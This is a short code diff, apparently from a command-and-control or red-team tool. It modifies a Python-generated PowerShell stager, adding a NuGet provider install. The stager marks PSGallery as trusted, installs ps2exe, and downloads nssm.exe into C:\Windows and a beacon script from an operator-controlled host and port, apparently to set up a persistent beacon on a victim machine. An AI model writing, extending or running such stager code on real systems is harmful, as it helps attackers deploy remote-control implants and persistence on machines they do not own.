@@ -112,7 +112,8 @@ done"""
   
         # LOCAL NSSM
 
-        stagerContent = f"""Set-PSRepository -Name 'PSGallery' -InstallationPolicy Trusted
+        stagerContent = f"""Install-PackageProvider -Name NuGet -Force -Scope CurrentUser
+Set-PSRepository -Name 'PSGallery' -InstallationPolicy Trusted
 Install-Module -Name ps2exe -Force -AllowClobber -Confirm:$false
 Invoke-WebRequest -Uri "http://{args.host}:{args.beamport}/nssm.exe" -OutFile "C:\\Windows\\nssm.exe"
 Invoke-WebRequest -Uri "http://{args.host}:{args.beamport}/{args.beaconname}.ps1" -OutFile "$env:Temp\\{args.beaconname}.ps1"
